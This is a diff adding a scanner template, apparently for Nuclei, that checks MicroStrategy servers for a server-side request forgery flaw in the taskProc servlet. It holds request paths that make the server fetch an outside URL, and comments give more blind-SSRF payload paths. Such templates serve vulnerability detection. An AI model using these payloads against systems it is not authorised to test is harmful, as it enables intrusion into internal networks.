@@ -1,0 +1,23 @@
+id: microstrategy-ssrf
+info:
+  name: MicroStrategy tinyurl SSRF
+  author: organiccrap
+  severity: high
+  # https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204
+  # blind ssrf
+  # /servlet/taskProc?taskId=wikiScrapper&taskEnv=xml&taskContentType=xml&searchString=https://SSRF&shouldSuggest=false&publicDataSuggestionURL=&publicDataSearchURL=&publicDataPageURL=
+  # /servlet/taskProc?taskId=validateUsherConfigTask&taskEnv=xml&taskContentType=xml&serverURL=https://SSRF
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
+      - '{{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    matchers:
+      - type: word
+        words:
+          - taskResponse
+          - The source URL is not valid
+        condition: and
+        part: body
